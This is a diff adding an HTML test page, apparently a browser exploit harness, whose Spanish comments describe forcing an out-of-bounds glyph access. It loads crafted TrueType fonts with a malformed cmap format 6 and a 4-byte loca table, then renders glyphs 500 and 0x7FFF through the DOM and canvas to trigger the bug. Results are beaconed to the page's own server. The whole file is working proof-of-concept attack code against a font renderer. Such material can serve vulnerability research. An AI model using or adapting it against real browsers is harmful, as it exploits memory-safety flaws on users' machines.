@@ -1,0 +1,93 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script>
+<title>FA-v34-gl — press-34: forzar acceso a GLIFOS (cmap6→500/0x7FFF sobre loca de 4B)</title></head>
+<body><pre id="out">FA-v34-gl…<br><span id="rx" style="font-family:serif">A</span></pre>
+<script>
+(function(){
+"use strict";
+/* FA-v34-gl — press-34: el OOB vive en el ACCESO al glifo, no en load().
+ * Cargas primero (benignas esperadas), luego renders forzados:
+ * g0  = f0 (baseline)  · g0b = run×32 con f0 (shaping-forcing)
+ * g8  = f8 glifo 500   · g8b = run×32 f8 (más accesos)
+ * g9  = run×32 f9 glifo 0x7FFF (LETAL-LAST)
+ * Canvas 2d si existe = vía más fuerte (fillText = parseo garantizado). */
+var RID="v34g"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("V34-HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+var cv=document.createElement("canvas");
+var ctx=null; var cvt="-";
+try{ ctx=cv.getContext("2d"); cvt=ctx?"2d-ok":"no-2d"; }catch(e){ cvt="E"; }
+bk("V34-L","v34-gl; dr="+dr+"; rt="+rt+"; canvas2d="+cvt);
+
+function Trnd(){ return Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36); }
+
+function loadOne(id, f){
+  return new Promise(function(res){
+    bk("V34-E"+id, "enter-load "+id);
+    var ff;
+    try{ ff=new FontFace("fef-"+id, "url(/document/al/ps5/"+f+"?t="+Trnd()+")"); }
+    catch(e){ bk("V34-R"+id, id+" ctor-E:"+String((e&&e.message)||e).slice(0,50)); res(); return; }
+    document.fonts.add(ff);
+    var half=setTimeout(function(){ bk("V34-R"+id, id+" LOAD-COLGADO(6s)"); res(); },6000);
+    ff.load().then(function(f2){ clearTimeout(half);
+      bk("V34-R"+id, id+" load=OK st="+f2.status); res(); },
+    function(err){ clearTimeout(half);
+      bk("V34-R"+id, id+" rechaza: "+String((err&&err.name)+" "+(err&&err.message)||err).slice(0,60)); res(); });
+  });
+}
+
+var rx=document.getElementById("rx");
+function renderDOM(id, txt){
+  rx.style.fontFamily="fef-"+id+", serif";
+  rx.style.fontSize="40px";
+  rx.textContent=txt;
+  var w="-";
+  try{ w=Math.round(rx.getBoundingClientRect().width*10)/10; }catch(e){ w="E"; }
+  rx.style.fontFamily="serif";
+  return w;
+}
+function renderCV(id, txt){
+  if(!ctx) return null;
+  try{
+    ctx.clearRect(0,0,300,80);
+    ctx.font="40px fef-"+id+", serif";
+    ctx.fillStyle="#f00";
+    ctx.fillText(txt,5,50);
+    var d=ctx.getImageData(0,0,8,8).data;
+    var sum=0; for(var i=0;i<d.length;i+=4) sum+=d[i];
+    return "cv-sum="+sum;
+  }catch(e){ return "cv-E:"+String((e&&e.message)||e).slice(0,40); }
+}
+
+function renderRow(id, txt){
+  return new Promise(function(res){
+    bk("V34-E"+id, "enter-render "+id);
+    var w="-",c=null;
+    try{ w=renderDOM(id, txt); }catch(e){ w="E"; }
+    c=renderCV(id, txt);
+    bk("V34-R"+id, id+" width="+w+";"+(c===null?"sin-2d":c));
+    res();
+  });
+}
+
+var RUN="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+var p=Promise.resolve();
+p=p.then(function(){ return loadOne("f8","f8.ttf"); });
+p=p.then(function(){ return loadOne("f9","f9.ttf"); });
+p=p.then(function(){ return loadOne("f0","f0.ttf"); });
+p=p.then(function(){ return renderRow("g0","A"); });
+p=p.then(function(){ return renderRow("g0b",RUN); });
+p=p.then(function(){ return renderRow("g8","A"); });
+p=p.then(function(){ return renderRow("g8b",RUN); });
+p=p.then(function(){ return renderRow("g9",RUN); });   /* LETAL-LAST */
+p.catch(function(e){ bk("V34-ERR","seq:"+String((e&&e.message)||e).slice(0,60)); });
+p.then(function(){ clearInterval(HB); bk("V34-Z","FA-v34-gl complete"); });
+setTimeout(function(){ clearInterval(HB); bk("V34-Z2","global-timeout(30s)"); },30000);
+})();
+</script></body></html>
